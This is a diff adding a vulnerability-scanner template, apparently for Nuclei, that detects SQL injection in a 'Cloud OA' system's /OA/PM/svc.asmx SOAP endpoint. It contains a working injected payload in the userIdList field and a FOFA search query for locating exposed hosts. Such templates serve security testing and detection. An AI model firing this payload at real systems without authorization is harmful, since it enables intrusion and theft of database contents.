@@ -1,0 +1,41 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - System.Data.SqlClient.SqlException
+    - '{{md5(num)}}'
+  - part: header
+    type: word
+    words:
+    - text/xml
+  - status:
+    - 500
+    type: status
+  matchers-condition: and
+  raw:
+  - "POST /OA/PM/svc.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n\
+    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetUsersInfo xmlns=\"http://tempuri.org/\">\n      <userIdList>LOWER(CONVERT(VARCHAR(32),HashBytes('MD5','{{num}}'),2))</userIdList>\n\
+    \    </GetUsersInfo>\n  </soap:Body>\n</soap:Envelope>\n"
+id: cloud-oa-system-sqli
+info:
+  author: SleepingBag945
+  description: 'cloud OA system /OA/PM/svc.asmx page parameters are not properly filtered,
+    resulting in a SQL injection vulnerability, which can be used to obtain sensitive
+    information in the database.
+
+    '
+  metadata:
+    fofa-query: "body=\"\u5168\u7A0B\u4E91\u529E\u516C\" && body=\"/OA/WebResource.axd\""
+    max-request: 1
+    verified: true
+  name: Cloud OA System - SQL Injection
+  reference:
+  - https://github.com/GREENHAT7/pxplan/blob/e2fc04893ca95e177021ddf61cc2134ecc120a8e/xray_pocs/yaml-poc-eqccd-eqccd_oa-sql_injection-CT-456760.yml#L8
+  severity: high
+  tags: cloud,cloudoa,sqli
+variables:
+  num: '999999999'
